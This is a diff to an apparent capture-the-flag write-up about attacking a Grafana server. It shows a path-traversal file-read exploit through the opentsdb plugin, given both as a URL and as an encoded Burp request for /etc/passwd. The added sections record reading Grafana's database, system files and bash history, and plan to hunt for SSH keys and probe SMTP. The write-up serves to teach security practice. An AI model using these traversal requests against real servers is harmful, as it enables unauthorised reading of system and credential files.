@@ -9,7 +9,7 @@
 
 ## Description
 
-Get The highest privilege on the machine and find the flag!
+Get The highest privilege on the machine and find the flag!  
 Target IP: 18.156.136.169
 
 ## Notes
@@ -136,7 +136,7 @@ http://18.156.136.169:8888//public/plugins/opentsdb/../../../../../../../../../.
 ```
 The exploit was able to found a plugin **opentsdb** but failed to perform LFI
 
-Let's decode the payload i'll use Burp
+Let's encode the payload i'll use Burp
 
 ```http
 GET /public/plugins/opentsdb/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd HTTP/1.1
@@ -189,4 +189,65 @@ We need to find more files, i used burp with linux files and also known grafana 
 - nothing special is the default file
 
 **/var/lib/grafana/grafana.db**
+- we can load it to SQLite and explore. nothing intresting
 
+**/etc/hostname**  
+- Hostname : bed76934b271
+
+**/etc/os-release** 
+
+```
+NAME="Alpine Linux"
+ID=alpine
+VERSION_ID=3.14.3
+PRETTY_NAME="Alpine Linux v3.14"
+HOME_URL="https://alpinelinux.org/"
+BUG_REPORT_URL="https://bugs.alpinelinux.
+```
+We are in a docker container
+
+**/etc/hosts**
+- 172.18.0.2 is our grafana container internal IP
+
+```
+127.0.0.1	localhost
+::1	localhost ip6-localhost ip6-loopback
+fe00::0	ip6-localnet
+ff00::0	ip6-mcastprefix
+ff02::1	ip6-allnodes
+ff02::2	ip6-allrouters
+172.18.0.2	bed76934b271
+```
+
+**/home/grafana/.bash_history**
+
+- It a huge hint for the solution, we need to use the ssh key to connect to the machine
+Unfortunately i wasn't able to find any key inside /home/grafana/.ssh/ 
+
+```
+ls
+cd /home
+ls
+cd grafana/
+ls
+ls -la
+cd .ssh/
+ls
+exit
+```
+**SMTP**  
+
+Unfortunately smtp wasn't reachable from my network. i tried using another network and it's worked
+
+telnet 18.156.136.169 25
+
+```
+Trying 18.156.136.169...
+Connected to 18.156.136.169.
+Escape character is '^]'.
+220 ip-172-31-32-66.eu-central-1.compute.internal ESMTP Postfix (Ubuntu)
+```
+
+We have two things to do :
+- try find the ssh key filename inside /home/grafana/.ssh/
+- intercat with smtp and the email bob@tearys.corp
